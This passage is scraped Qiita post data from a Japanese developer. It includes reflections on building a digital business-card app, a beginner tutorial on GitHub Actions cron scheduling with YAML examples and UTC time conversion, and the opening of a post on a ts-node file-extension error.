data-sourcepos=\"22:1-22:189\">以前と同じエラーや、「ここどうしたらいいんだっけ？」と思った際に、過去に書いた記事を見返してスムーズに進めることができました。</p>\n<p data-sourcepos=\"24:1-24:115\"><strong>自分が書いた記事も将来の自分に役立つドキュメントになる</strong>と改めて思いました。</p>\n<p data-sourcepos=\"26:1-26:160\">また、同じコミュニティの方の記事を読んで、<strong>自分とは違う解決方法や理解の過程を知ることも刺激になりました。</strong></p>\n<p data-sourcepos=\"28:1-28:162\">過去の私ありがとう、過去の同じエラーに遭遇して記事にしてくれた方ありがとうとしみじみと感じた開発期間でした。</p>\n<h2 data-sourcepos=\"30:1-30:81\">\n<span id=\"timer-githubactionsでスケジュール実行ができるようになった\" class=\"fragment\"></span><a href=\"#timer-githubactions%E3%81%A7%E3%82%B9%E3%82%B1%E3%82%B8%E3%83%A5%E3%83%BC%E3%83%AB%E5%AE%9F%E8%A1%8C%E3%81%8C%E3%81%A7%E3%81%8D%E3%82%8B%E3%82%88%E3%81%86%E3%81%AB%E3%81%AA%E3%81%A3%E3%81%9F\"><i class=\"fa fa-link\"></i></a><img alt=\":timer:\" class=\"emoji\" height=\"20\" src=\"https://cdn.qiita.com/emoji/twemoji/unicode/23f2.png\" title=\":timer:\" width=\"20\" loading=\"lazy\"> GitHubActionsでスケジュール実行ができるようになった</h2>\n<p data-sourcepos=\"31:1-32:57\">開発過程で、GitHubActionsでスケジュール実行を使ってデータを削除することに挑戦しました。<br>\nその時の奮闘はこちらにまとめています。</p>\n<p data-sourcepos=\"34:1-34:51\"><iframe id=\"qiita-embed-content__3892c48c770ef0ba436d5cdbe0a24a11\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__3892c48c770ef0ba436d5cdbe0a24a11\" data-content=\"https%3A%2F%2Fqiita.com%2Fasa129%2Fitems%2Fbfcb2005c0061e11f452\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"36:1-36:51\">私は保守・改修の仕事をしています。</p>\n<p data-sourcepos=\"38:1-39:194\">これまでバッチ機能を作ったことはありましたが、スケジュール実行は運用チームが担当していたため、わからないままでした。<br>\n<code>cronってワードは聞いたことがあるレベル、どうやってやって決まった時間に実行しているんだろう</code>と思うことはあったもの<code>思う</code>だけでした。</p>\n<p data-sourcepos=\"41:1-41:177\">実際にスケジュール実行を自分で作ってみて、こうやってやっているんだ！自分でもできる！という感覚を得ることができました。</p>\n<h2 data-sourcepos=\"44:1-44:75\">\n<span id=\"frowning2-デザインパターンに挑戦しかしながら挫折\" class=\"fragment\"></span><a href=\"#frowning2-%E3%83%87%E3%82%B6%E3%82%A4%E3%83%B3%E3%83%91%E3%82%BF%E3%83%BC%E3%83%B3%E3%81%AB%E6%8C%91%E6%88%A6%E3%81%97%E3%81%8B%E3%81%97%E3%81%AA%E3%81%8C%E3%82%89%E6%8C%AB%E6%8A%98\"><i class=\"fa fa-link\"></i></a><img alt=\":frowning2:\" class=\"emoji\" height=\"20\" src=\"https://cdn.qiita.com/emoji/twemoji/unicode/2639.png\" title=\":frowning2:\" width=\"20\" loading=\"lazy\"> デザインパターンに挑戦、しかしながら挫折</h2>\n<p data-sourcepos=\"45:1-45:147\">開発過程で、デザインパターンの活用（TemplateMethodパターンとFactoryMethodパターン）に挑戦しようとしました。</p>\n<p data-sourcepos=\"47:1-47:105\">TemplateMethodパターンは理解できたものの、FactoryMethodパターンで挫折しました。</p>\n<p data-sourcepos=\"49:1-49:384\">概念は理解できて、コード例も読めるし再現もできます。Copilotに何度も教えてもらって、「なるほど」となります。しかし、いざ自分のプロダクトに取り込もうとすると、<code>「どこで使えばいいの？」「あれ？これであっている？使えている？」</code>となり分からなくなってしまいました。</p>\n<p data-sourcepos=\"51:1-51:413\"><code>自分で説明できるまで理解できたことはその後も自分の糧になる</code>—これまでの学習で身に染みて実感していました。でも、コミュニティのメンターさんから「どうしても理解できないものは一旦寝かせることも大事」とアドバイスをもらいました。つよつよエンジニアの方も同じことを言われるそうです。</p>\n<p data-sourcepos=\"53:1-53:112\"><strong>理解できるときがきっとくることを信じて、一旦寝かせることを決断しました。</strong></p>\n<h1 data-sourcepos=\"56:1-56:14\">\n<span id=\"おわりに\" class=\"fragment\"></span><a href=\"#%E3%81%8A%E3%82%8F%E3%82%8A%E3%81%AB\"><i class=\"fa fa-link\"></i></a>おわりに</h1>\n<p data-sourcepos=\"57:1-58:120\">作り終わった後、何気に自分のスマートフォンで作ったプロダクトを表示させました。<br>\nスマートフォンサイズで作ったので、自分のスマートフォンで見たとき嬉しかったです。</p>\n<h1 data-sourcepos=\"60:1-60:34\">\n<span id=\"jisouのメンバー募集中\" class=\"fragment\"></span><a href=\"#jisou%E3%81%AE%E3%83%A1%E3%83%B3%E3%83%90%E3%83%BC%E5%8B%9F%E9%9B%86%E4%B8%AD\"><i class=\"fa fa-link\"></i></a>JISOUのメンバー募集中！</h1>\n<p data-sourcepos=\"61:1-64:9\">プログラミングコーチングJISOUでは、新たなメンバーを募集しています。<br>\n日本一のアウトプットコミュニティでキャリアアップしませんか？<br>\n興味のある方は、ぜひホームページをのぞいてみてください！<br>\n▼▼▼</p>\n<p data-sourcepos=\"66:1-66:19\"><iframe id=\"qiita-embed-content__b19db0e9255c27027a168ab0a5ba9ed4\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__b19db0e9255c27027a168ab0a5ba9ed4\" data-content=\"https%3A%2F%2Fprojisou.jp\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n","body":"# はじめに\nスマートフォンでの使用を想定したデジタル名刺アプリを作成しました。\n0→1で何かを作れるようになることを目標にして3か月半、開発中に得た気づきをまとめてみました。\n\n# 作ったもの\n\n* IDを使用して、デジタル名刺を管理できるアプリです\n* 名前、自己紹介を管理、GitHub・Qiita・Xへ容易に遷移できます\n* スマートフォンでの使用を想定\n\n![画面録画 2025-05-15 210306 (1).gif](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/79e55d5a-610b-47ab-879d-c8f2745264ce.gif)\n\nhttps://github.com/asa129/business-card-app\n\n\n# 作ってみて\n## :clap: 過去の記事に救われた\n開発中、何度も**過去の記事に救われた**と感じました。\n\n今回の名刺アプリでも、DBはSupabase、CI/CDの構築、Jest＋ReactTestingLibraryでのテスト実装など、以前作った学習記録アプリで使用した技術を使用して開発を行いました。\n\n以前と同じエラーや、「ここどうしたらいいんだっけ？」と思った際に、過去に書いた記事を見返してスムーズに進めることができました。\n\n**自分が書いた記事も将来の自分に役立つドキュメントになる**と改めて思いました。\n\nまた、同じコミュニティの方の記事を読んで、**自分とは違う解決方法や理解の過程を知ることも刺激になりました。**\n\n過去の私ありがとう、過去の同じエラーに遭遇して記事にしてくれた方ありがとうとしみじみと感じた開発期間でした。\n\n## :timer: GitHubActionsでスケジュール実行ができるようになった\n開発過程で、GitHubActionsでスケジュール実行を使ってデータを削除することに挑戦しました。\nその時の奮闘はこちらにまとめています。\n\nhttps://qiita.com/asa129/items/bfcb2005c0061e11f452\n\n私は保守・改修の仕事をしています。\n\nこれまでバッチ機能を作ったことはありましたが、スケジュール実行は運用チームが担当していたため、わからないままでした。\n`cronってワードは聞いたことがあるレベル、どうやってやって決まった時間に実行しているんだろう`と思うことはあったもの`思う`だけでした。\n\n実際にスケジュール実行を自分で作ってみて、こうやってやっているんだ！自分でもできる！という感覚を得ることができました。\n\n\n## :frowning2: デザインパターンに挑戦、しかしながら挫折\n開発過程で、デザインパターンの活用（TemplateMethodパターンとFactoryMethodパターン）に挑戦しようとしました。\n\nTemplateMethodパターンは理解できたものの、FactoryMethodパターンで挫折しました。\n\n概念は理解できて、コード例も読めるし再現もできます。Copilotに何度も教えてもらって、「なるほど」となります。しかし、いざ自分のプロダクトに取り込もうとすると、`「どこで使えばいいの？」「あれ？これであっている？使えている？」`となり分からなくなってしまいました。\n\n`自分で説明できるまで理解できたことはその後も自分の糧になる`—これまでの学習で身に染みて実感していました。でも、コミュニティのメンターさんから「どうしても理解できないものは一旦寝かせることも大事」とアドバイスをもらいました。つよつよエンジニアの方も同じことを言われるそうです。\n\n**理解できるときがきっとくることを信じて、一旦寝かせることを決断しました。**\n\n\n# おわりに\n作り終わった後、何気に自分のスマートフォンで作ったプロダクトを表示させました。\nスマートフォンサイズで作ったので、自分のスマートフォンで見たとき嬉しかったです。\n\n# JISOUのメンバー募集中！\nプログラミングコーチングJISOUでは、新たなメンバーを募集しています。\n日本一のアウトプットコミュニティでキャリアアップしませんか？\n興味のある方は、ぜひホームページをのぞいてみてください！\n▼▼▼\n\nhttps://projisou.jp\n","coediting":false,"comments_count":0,"created_at":"2025-05-18T19:00:23+09:00","group":null,"id":"5bf4d591dae7fbbab362","likes_count":6,"private":false,"reactions_count":0,"stocks_count":3,"tags":[{"name":"TypeScript","versions":[]},{"name":"React","versions":[]},{"name":"個人開発","versions":[]},{"name":"vite","versions":[]}],"title":"【個人開発学習】デジタル名刺アプリを作りました～作成過程で得た気づき３つ～","updated_at":"2025-05-18T19:00:23+09:00","url":"https://qiita.com/asa129/items/5bf4d591dae7fbbab362","user":{"description":"0→1でWebアプリケーションを作れるようになるために奮闘中です。\r\nアイコンは@chinchilla.maruさん\r\nhttps://www.instagram.com/chinchilla.maru/","facebook_id":"","followees_count":45,"followers_count":53,"github_login_name":"asa129","id":"asa129","items_count":62,"linkedin_id":"","location":"","name":"","organization":"","permanent_id":3993509,"profile_image_url":"https://s3-ap-northeast-1.amazonaws.com/qiita-image-store/0/3993509/ea9105b8f7fedddb7175e913eeb5c288385a364a/large.png?1739071881","team_only":false,"twitter_screen_name":"jad1290","website_url":""},"page_views_count":5391,"team_membership":null,"organization_url_name":"jisou","slide":false},{"rendered_body":"<h1 data-sourcepos=\"1:1-1:14\">\n<span id=\"はじめに\" class=\"fragment\"></span><a href=\"#%E3%81%AF%E3%81%98%E3%82%81%E3%81%AB\"><i class=\"fa fa-link\"></i></a>はじめに</h1>\n<p data-sourcepos=\"2:1-2:144\">指定した時間にバッチ実行できる仕組みを習得しました。今後困らないように備忘録としてまとめました。</p>\n<h1 data-sourcepos=\"4:1-4:12\">\n<span id=\"cronとは\" class=\"fragment\"></span><a href=\"#cron%E3%81%A8%E3%81%AF\"><i class=\"fa fa-link\"></i></a>cronとは</h1>\n<p data-sourcepos=\"5:1-5:114\">UNIX系OS（Linuxなど）に標準で搭載されている<strong>定期的な自動実行を行うための仕組み</strong></p>\n<h1 data-sourcepos=\"7:1-7:31\">\n<span id=\"githubactionsでcronを使う\" class=\"fragment\"></span><a href=\"#githubactions%E3%81%A7cron%E3%82%92%E4%BD%BF%E3%81%86\"><i class=\"fa fa-link\"></i></a>GithubActionsでcronを使う</h1>\n<p data-sourcepos=\"9:1-9:40\"><strong>公式ドキュメントより引用</strong></p>\n<blockquote data-sourcepos=\"10:1-10:118\">\n<p data-sourcepos=\"10:2-10:118\">schedule イベントを使うと、スケジュールした時刻にワークフローをトリガーできます。</p>\n</blockquote>\n<p data-sourcepos=\"12:1-12:124\"><iframe id=\"qiita-embed-content__db842e64c545ed981f0211db5747c626\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__db842e64c545ed981f0211db5747c626\" data-content=\"https%3A%2F%2Fdocs.github.com%2Fja%2Factions%2Fwriting-workflows%2Fchoosing-when-your-workflow-runs%2Fevents-that-trigger-workflows%23schedule\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<h1 data-sourcepos=\"14:1-14:30\">\n<span id=\"cronの基本的な書き方\" class=\"fragment\"></span><a href=\"#cron%E3%81%AE%E5%9F%BA%E6%9C%AC%E7%9A%84%E3%81%AA%E6%9B%B8%E3%81%8D%E6%96%B9\"><i class=\"fa fa-link\"></i></a>cronの基本的な書き方</h1>\n<p data-sourcepos=\"16:1-16:71\">cron: \"<code>分</code> <code>時間</code> <code>日</code> <code>月</code> <code>曜日（[0,6]、0は日曜日）</code> \"</p>\n<div class=\"code-frame\" data-lang=\"yml\" data-sourcepos=\"18:1-31:3\">\n<div class=\"code-lang\"><span class=\"bold\">delete-data-auto.yml</span></div>\n<div class=\"highlight\"><pre><code><span class=\"na\">name</span><span class=\"pi\">:</span> <span class=\"s\">delete-data-auto</span>\n\n<span class=\"na\">on</span><span class=\"pi\">:</span>\n  <span class=\"na\">schedule</span><span class=\"pi\">:</span>\n    <span class=\"pi\">-</span> <span class=\"na\">cron</span><span class=\"pi\">:</span> <span class=\"s2\">\"</span><span class=\"s\">0</span><span class=\"nv\"> </span><span class=\"s\">21</span><span class=\"nv\"> </span><span class=\"s\">*</span><span class=\"nv\"> </span><span class=\"s\">*</span><span class=\"nv\"> </span><span class=\"s\">*\"</span>\n  <span class=\"na\">workflow_dispatch</span><span class=\"pi\">:</span>\n\n<span class=\"na\">jobs</span><span class=\"pi\">:</span>\n  <span class=\"na\">delete_data</span><span class=\"pi\">:</span>\n    <span class=\"na\">runs-on</span><span class=\"pi\">:</span> <span class=\"s\">ubuntu-latest</span>\n    <span class=\"na\">steps</span><span class=\"pi\">:</span>\n      <span class=\"pi\">-</span> <span class=\"na\">run</span><span class=\"pi\">:</span> <span class=\"s\">echo \"cron追加したよ\"</span>\n</code></pre></div>\n</div>\n<h1 data-sourcepos=\"33:1-33:38\">\n<span id=\"他にもこんな設定ができる\" class=\"fragment\"></span><a href=\"#%E4%BB%96%E3%81%AB%E3%82%82%E3%81%93%E3%82%93%E3%81%AA%E8%A8%AD%E5%AE%9A%E3%81%8C%E3%81%A7%E3%81%8D%E3%82%8B\"><i class=\"fa fa-link\"></i></a>他にもこんな設定ができる</h1>\n<h4 data-sourcepos=\"35:1-35:34\">\n<span id=\"x分ごとに1回実行する\" class=\"fragment\"></span><a href=\"#x%E5%88%86%E3%81%94%E3%81%A8%E3%81%AB1%E5%9B%9E%E5%AE%9F%E8%A1%8C%E3%81%99%E3%82%8B\"><i class=\"fa fa-link\"></i></a>X分ごとに1回実行する</h4>\n<p data-sourcepos=\"36:1-36:61\">最短5分毎にスケジュール実行することが可能</p>\n<p data-sourcepos=\"38:1-38:40\"><strong>公式ドキュメントより引用</strong></p>\n<blockquote data-sourcepos=\"40:1-40:114\">\n<p data-sourcepos=\"40:2-40:114\">スケジュールされたワークフローを実行できる最短の間隔は、5 分ごとに 1 回です。</p>\n</blockquote>\n<div class=\"code-frame\" data-lang=\"yml\" data-sourcepos=\"42:1-46:3\"><div class=\"highlight\"><pre><code><span class=\"na\">on</span><span class=\"pi\">:</span>\n  <span class=\"na\">schedule</span><span class=\"pi\">:</span>\n    <span class=\"pi\">-</span> <span class=\"na\">cron</span><span class=\"pi\">:</span> <span class=\"s2\">\"</span><span class=\"s\">*/5</span><span class=\"nv\"> </span><span class=\"s\">*</span><span class=\"nv\"> </span><span class=\"s\">*</span><span class=\"nv\"> </span><span class=\"s\">*</span><span class=\"nv\"> </span><span class=\"s\">*\"</span> <span class=\"c1\"># 5分ごとに実行</span>\n</code></pre></div></div>\n<h4 data-sourcepos=\"48:1-48:44\">\n<span id=\"区切りで複数時間設定可能\" class=\"fragment\"></span><a href=\"#%E5%8C%BA%E5%88%87%E3%82%8A%E3%81%A7%E8%A4%87%E6%95%B0%E6%99%82%E9%96%93%E8%A8%AD%E5%AE%9A%E5%8F%AF%E8%83%BD\"><i class=\"fa fa-link\"></i></a><code>,</code>区切りで複数時間設定可能</h4>\n<div class=\"code-frame\" data-lang=\"yml\" data-sourcepos=\"49:1-54:3\"><div class=\"highlight\"><pre><code><span class=\"na\">on</span><span class=\"pi\">:</span>\n  <span class=\"na\">schedule</span><span class=\"pi\">:</span>\n    <span class=\"pi\">-</span> <span class=\"na\">cron</span><span class=\"pi\">:</span> <span class=\"s2\">\"</span><span class=\"s\">0</span><span class=\"nv\"> </span><span class=\"s\">21,17</span><span class=\"nv\"> </span><span class=\"s\">*</span><span class=\"nv\"> </span><span class=\"s\">*</span><span class=\"nv\"> </span><span class=\"s\">*\"</span> <span class=\"c1\"># 21時と17時に実行</span>\n  <span class=\"na\">workflow_dispatch</span><span class=\"pi\">:</span>\n</code></pre></div></div>\n<h4 data-sourcepos=\"56:1-56:34\">\n<span id=\"毎時間xx00に実行する\" class=\"fragment\"></span><a href=\"#%E6%AF%8E%E6%99%82%E9%96%93xx00%E3%81%AB%E5%AE%9F%E8%A1%8C%E3%81%99%E3%82%8B\"><i class=\"fa fa-link\"></i></a>毎時間XX:00に実行する</h4>\n<div class=\"code-frame\" data-lang=\"yml\" data-sourcepos=\"57:1-62:3\"><div class=\"highlight\"><pre><code><span class=\"na\">on</span><span class=\"pi\">:</span>\n  <span class=\"na\">schedule</span><span class=\"pi\">:</span>\n    <span class=\"pi\">-</span> <span class=\"na\">cron</span><span class=\"pi\">:</span> <span class=\"s2\">\"</span><span class=\"s\">0</span><span class=\"nv\"> </span><span class=\"s\">*</span><span class=\"nv\"> </span><span class=\"s\">*</span><span class=\"nv\"> </span><span class=\"s\">*</span><span class=\"nv\"> </span><span class=\"s\">*\"</span> \n  <span class=\"na\">workflow_dispatch</span><span class=\"pi\">:</span>\n</code></pre></div></div>\n<h1 data-sourcepos=\"63:1-63:11\">\n<span id=\"注意点\" class=\"fragment\"></span><a href=\"#%E6%B3%A8%E6%84%8F%E7%82%B9\"><i class=\"fa fa-link\"></i></a>注意点</h1>\n<h2 data-sourcepos=\"64:1-64:33\">\n<span id=\"スケジュール時間はutc\" class=\"fragment\"></span><a href=\"#%E3%82%B9%E3%82%B1%E3%82%B8%E3%83%A5%E3%83%BC%E3%83%AB%E6%99%82%E9%96%93%E3%81%AFutc\"><i class=\"fa fa-link\"></i></a>スケジュール時間はUTC</h2>\n<div data-sourcepos=\"65:1-68:3\" class=\"note warn\">\n<span class=\"fa fa-fw fa-exclamation-circle\"></span><div>\n<p data-sourcepos=\"66:1-67:76\">スケジュール時間は (UTC) で設定される。<br>\n<strong>UTC：協定世界時、世界で標準時として使っている時間</strong></p>\n</div>\n</div>\n<p data-sourcepos=\"70:1-71:90\">UTCは日本時間(JST)から9時間引いた値<br>\n例えば、午前6時に起動したい場合、06:00から9時間引いた21:00を設定</p>\n<div class=\"code-frame\" data-lang=\"text\" data-sourcepos=\"72:1-75:3\"><div class=\"highlight\"><pre><code>日本時間 6:00 → UTC 21:00（前日）\n計算：6 - 9 = -3 → 24 + (-3) = 21\n</code></pre></div></div>\n<h2 data-sourcepos=\"77:1-77:41\">\n<span id=\"scheduleトリガーは遅延しがち\" class=\"fragment\"></span><a href=\"#schedule%E3%83%88%E3%83%AA%E3%82%AC%E3%83%BC%E3%81%AF%E9%81%85%E5%BB%B6%E3%81%97%E3%81%8C%E3%81%A1\"><i class=\"fa fa-link\"></i></a>scheduleトリガーは遅延しがち</h2>\n<p data-sourcepos=\"78:1-78:40\"><strong>公式ドキュメントより引用</strong></p>\n<blockquote data-sourcepos=\"79:1-79:233\">\n<p data-sourcepos=\"79:2-79:233\">GitHub Actions のワークフローの実行によって高い負荷がかかっている間、schedule イベントが遅延する可能性があります。 高負荷の時間帯には、毎時の開始時点が含まれます。</p>\n</blockquote>\n<p data-sourcepos=\"81:1-81:63\">今後は、<code>repository_dispatch</code>を使うようにしたい。</p>\n<p data-sourcepos=\"83:1-83:48\"><iframe id=\"qiita-embed-content__4a8febb9340ae3d9b70127628fa9c0b9\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__4a8febb9340ae3d9b70127628fa9c0b9\" data-content=\"https%3A%2F%2Fzenn.dev%2Fno4_dev%2Farticles%2F14b295b8dafbfd\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"85:1-85:135\"><iframe id=\"qiita-embed-content__15f15ae77da78c4ace59d3b359b20d65\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__15f15ae77da78c4ace59d3b359b20d65\" data-content=\"https%3A%2F%2Fdocs.github.com%2Fja%2Factions%2Fwriting-workflows%2Fchoosing-when-your-workflow-runs%2Fevents-that-trigger-workflows%23repository_dispatch\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<h1 data-sourcepos=\"87:1-87:14\">\n<span id=\"おわりに\" class=\"fragment\"></span><a href=\"#%E3%81%8A%E3%82%8F%E3%82%8A%E3%81%AB\"><i class=\"fa fa-link\"></i></a>おわりに</h1>\n<p data-sourcepos=\"88:1-89:75\">cronって聞いたことあるなあくらいの認識だったのですが、使いこなせるようになったことは大変嬉しいです。<br>\n日本時間とUTCを考慮しないといけないのは盲点でした。</p>\n<h1 data-sourcepos=\"91:1-91:8\">\n<span id=\"参考\" class=\"fragment\"></span><a href=\"#%E5%8F%82%E8%80%83\"><i class=\"fa fa-link\"></i></a>参考</h1>\n<p data-sourcepos=\"92:1-92:50\"><iframe id=\"qiita-embed-content__bc59786d247f42f1094f7f568c234339\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__bc59786d247f42f1094f7f568c234339\" data-content=\"https%3A%2F%2Fzenn.dev%2Fkisukeyas%2Farticles%2F6d50c1d015d066\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"94:1-94:124\"><iframe id=\"qiita-embed-content__a3cbab3f0104c43500a435248b2475c2\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__a3cbab3f0104c43500a435248b2475c2\" data-content=\"https%3A%2F%2Fdocs.github.com%2Fja%2Factions%2Fwriting-workflows%2Fchoosing-when-your-workflow-runs%2Fevents-that-trigger-workflows%23schedule\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"96:1-96:84\"><iframe id=\"qiita-embed-content__8867b8f02b483ef9ba3d2d20a4901ceb\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__8867b8f02b483ef9ba3d2d20a4901ceb\" data-content=\"https%3A%2F%2Fpubs.opengroup.org%2Fonlinepubs%2F9699919799%2Futilities%2Fcrontab.html%23tag_20_25_07\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"98:1-98:37\"><iframe id=\"qiita-embed-content__7fd08ca44abdba1273d6b15bdd6e1b81\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__7fd08ca44abdba1273d6b15bdd6e1b81\" data-content=\"https%3A%2F%2Fwa3.i-3-i.info%2Fword11831.html\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"100:1-100:48\"><iframe id=\"qiita-embed-content__3a12747bdf76b34873ce716727e94c37\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__3a12747bdf76b34873ce716727e94c37\" data-content=\"https%3A%2F%2Fzenn.dev%2Fno4_dev%2Farticles%2F14b295b8dafbfd\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n","body":"# はじめに\n指定した時間にバッチ実行できる仕組みを習得しました。今後困らないように備忘録としてまとめました。\n\n# cronとは\nUNIX系OS（Linuxなど）に標準で搭載されている**定期的な自動実行を行うための仕組み**\n\n# GithubActionsでcronを使う\n\n**公式ドキュメントより引用**\n>schedule イベントを使うと、スケジュールした時刻にワークフローをトリガーできます。\n\nhttps://docs.github.com/ja/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows#schedule\n\n# cronの基本的な書き方\n\ncron: \"`分` `時間` `日` `月` `曜日（[0,6]、0は日曜日）` \"\n\n```yml:delete-data-auto.yml\nname: delete-data-auto\n\non:\n  schedule:\n    - cron: \"0 21 * * *\"\n  workflow_dispatch:\n\njobs:\n  delete_data:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo \"cron追加したよ\"\n```\n\n# 他にもこんな設定ができる\n\n#### X分ごとに1回実行する\n最短5分毎にスケジュール実行することが可能\n\n**公式ドキュメントより引用**\n\n>スケジュールされたワークフローを実行できる最短の間隔は、5 分ごとに 1 回です。\n\n```yml\non:\n  schedule:\n    - cron: \"*/5 * * * *\" # 5分ごとに実行\n```\n\n#### `,`区切りで複数時間設定可能\n```yml\non:\n  schedule:\n    - cron: \"0 21,17 * * *\" # 21時と17時に実行\n  workflow_dispatch:\n```\n\n#### 毎時間XX:00に実行する\n```yml\non:\n  schedule:\n    - cron: \"0 * * * *\" \n  workflow_dispatch:\n```\n# 注意点\n## スケジュール時間はUTC\n:::note warn\nスケジュール時間は (UTC) で設定される。\n**UTC：協定世界時、世界で標準時として使っている時間**\n:::\n\nUTCは日本時間(JST)から9時間引いた値\n例えば、午前6時に起動したい場合、06:00から9時間引いた21:00を設定\n```\n日本時間 6:00 → UTC 21:00（前日）\n計算：6 - 9 = -3 → 24 + (-3) = 21\n```\n\n## scheduleトリガーは遅延しがち\n**公式ドキュメントより引用**\n>GitHub Actions のワークフローの実行によって高い負荷がかかっている間、schedule イベントが遅延する可能性があります。 高負荷の時間帯には、毎時の開始時点が含まれます。\n\n今後は、`repository_dispatch`を使うようにしたい。\n\nhttps://zenn.dev/no4_dev/articles/14b295b8dafbfd\n\nhttps://docs.github.com/ja/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows#repository_dispatch\n\n# おわりに\ncronって聞いたことあるなあくらいの認識だったのですが、使いこなせるようになったことは大変嬉しいです。\n日本時間とUTCを考慮しないといけないのは盲点でした。\n\n# 参考\nhttps://zenn.dev/kisukeyas/articles/6d50c1d015d066\n\nhttps://docs.github.com/ja/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows#schedule\n\nhttps://pubs.opengroup.org/onlinepubs/9699919799/utilities/crontab.html#tag_20_25_07\n\nhttps://wa3.i-3-i.info/word11831.html\n\nhttps://zenn.dev/no4_dev/articles/14b295b8dafbfd\n","coediting":false,"comments_count":0,"created_at":"2025-05-14T23:26:38+09:00","group":null,"id":"bfcb2005c0061e11f452","likes_count":3,"private":false,"reactions_count":0,"stocks_count":2,"tags":[{"name":"cron","versions":[]},{"name":"GitHubActions","versions":[]},{"name":"Supabase","versions":[]}],"title":"【GitHubActions】指定した時間にバッチ実行したい","updated_at":"2025-05-14T23:26:38+09:00","url":"https://qiita.com/asa129/items/bfcb2005c0061e11f452","user":{"description":"0→1でWebアプリケーションを作れるようになるために奮闘中です。\r\nアイコンは@chinchilla.maruさん\r\nhttps://www.instagram.com/chinchilla.maru/","facebook_id":"","followees_count":45,"followers_count":53,"github_login_name":"asa129","id":"asa129","items_count":62,"linkedin_id":"","location":"","name":"","organization":"","permanent_id":3993509,"profile_image_url":"https://s3-ap-northeast-1.amazonaws.com/qiita-image-store/0/3993509/ea9105b8f7fedddb7175e913eeb5c288385a364a/large.png?1739071881","team_only":false,"twitter_screen_name":"jad1290","website_url":""},"page_views_count":701,"team_membership":null,"organization_url_name":"jisou","slide":false},{"rendered_body":"<h1 data-sourcepos=\"1:1-1:14\">\n<span id=\"はじめに\" class=\"fragment\"></span><a href=\"#%E3%81%AF%E3%81%98%E3%82%81%E3%81%AB\"><i class=\"fa fa-link\"></i></a>はじめに</h1>\n<p data-sourcepos=\"2:1-3:87\">tsファイルをコマンドで叩いて実行する際に、表題のエラーになりました。<br>\n解決に時間がかかってしまったため、備忘録としてまとめます。</p>\n<h1 data-sourcepos=\"5:1-5:8\">\n<span id=\"問題\" class=\"fragment\"></span><a href=\"#%E5%95%8F%E9%A1%8C\"><i class=\"fa fa-link\"></i></a>問題</h1>\n<p data-sourcepos=\"6:1-6:156\"><code>npx ts-node --esm ./batch/index.ts </code>コマンドを実行すると<code>TypeError [ERR_UNKNOWN_FILE_EXTENSION]: Unknown file extension \".ts\" for</code>が発生する</p>\n<p data-sourcepos=\"8:1-8:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F2ddbb307-c221-444a-9674-6ba7f82e6737.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=a9ecb05b5da3e795d27cdbbdf2194220\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F2ddbb307-c221-444a-9674-6ba7f82e6737.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=a9ecb05b5da3e795d27cdbbdf2194220\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F2ddbb307-c221-444a-9674-6ba7f82e6737.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=615f8569f850cdd3ad6c9ca5e36b2d4d 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/2ddbb307-c221-444a-9674-6ba7f82e6737.png\" loading=\"lazy\"></a></p>\n<h4 data-sourcepos=\"10:1-10:35\">\n<span id=\"コマンドの意味を理解\" class=\"fragment\"></span><a href=\"#%E3%82%B3%E3%83%9E%E3%83%B3%E3%83%89%E3%81%AE%E6%84%8F%E5%91%B3%E3%82%92%E7%90%86%E8%A7%A3\"><i class=\"fa 